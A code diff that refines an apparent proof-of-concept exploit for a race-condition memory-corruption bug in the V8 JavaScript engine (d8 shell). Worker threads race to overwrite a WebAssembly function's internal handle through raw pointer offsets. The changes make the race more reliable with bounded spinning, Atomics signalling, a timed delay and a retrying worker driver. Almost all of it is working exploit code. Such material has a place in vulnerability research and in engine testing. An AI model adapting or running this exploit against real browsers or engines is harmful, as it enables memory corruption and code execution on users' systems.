@@ -1,3 +1,10 @@
+const DRIVER_TIMEOUT_MS = 5000;
+const DRIVER_ATTEMPTS = 3;
+
+const driverScript = function() {
+  onmessage = function({ data: doneBuffer }) {
+    const driverDone = new Int32Array(doneBuffer);
+    try {
 // d8.file.execute('../../test/mjsunit/wasm/wasm-module-builder.js');
 
 // let builder = new WasmModuleBuilder();
@@ -38,10 +45,21 @@ let wasm_code = [
       const shared_age_ptr = shared + 0x2b;
       const func_victim_handle_ptr = func_victim_ptr + 0xb;
   
-      function race(sync, age_ptr, handle_ptr, handle) {
-        Atomics.notify(sync, 0, 1);
-        while (memory.getUint32(age_ptr, true) === 0x1337);
-        memory.setUint32(handle_ptr, handle, true);
+      function race(sync, age_ptr, handle_ptr, handle, max_spins = 100000, signal = false) {
+        if (signal) {
+          Atomics.store(sync, 0, 1);
+          Atomics.notify(sync, 0, 1);
+        }
+        for (let i = 0; i < max_spins; i++) {
+          if (memory.getUint32(age_ptr, true) !== 0x1337) {
+            if (signal) {
+              for (let delay = 0; delay < 900; delay++);
+            }
+            memory.setUint32(handle_ptr, handle, true);
+            return true;
+          }
+        }
+        return false;
       }
   
       let array = new Array(0xfff0); // large object
@@ -53,12 +71,13 @@ let wasm_code = [
       // race(dummy_sync, elements_ptr + 0x7, elements_ptr + 0x11, 1);
       // %OptimizeFunctionOnNextCall(race);
       // race(dummy_sync, elements_ptr + 0x7, elements_ptr + 0x11, 1);
-      for (let i = 0; i < 1e6; i++) {
-        race(dummy_sync, elements_ptr + 0x7, elements_ptr + 0x11, 1);
-        race(dummy_sync, elements_ptr + 0x7, elements_ptr + 0x11, 1);
+      for (let i = 0; i < 20000; i++) {
+        race(dummy_sync, elements_ptr + 0x7, elements_ptr + 0x11, 1, 1);
+        race(dummy_sync, elements_ptr + 0x7, elements_ptr + 0x11, 1, 1);
       }
     //   console.log("worker: racing");
-      race(sync, shared_age_ptr, func_victim_handle_ptr, func_baseline_handle);
+      race(sync, shared_age_ptr, func_victim_handle_ptr, func_baseline_handle, 100000, true);
+      if (typeof close === 'function') close();
     //   console.log('worker: victim patched');
     }
   }
@@ -137,5 +156,22 @@ let wasm_code = [
   
   let instance = new WebAssembly.Instance(module, { m: { f: foo } });
   instance.exports.main(0x414141414141n);
-  
+    } finally {
+      Atomics.store(driverDone, 0, 1);
+      Atomics.notify(driverDone, 0);
+      if (typeof close === 'function') close();
+    }
+  };
+};
+
+for (let attempt = 0; attempt < DRIVER_ATTEMPTS; attempt++) {
+  const driverDone = new Int32Array(new SharedArrayBuffer(4));
+  const driver = new Worker(driverScript, { type: 'function' });
+  driver.postMessage(driverDone.buffer);
+  Atomics.wait(driverDone, 0, 0, DRIVER_TIMEOUT_MS);
+  driver.terminate();
+}
+
+quit(0);
+
 //   console.log('done');
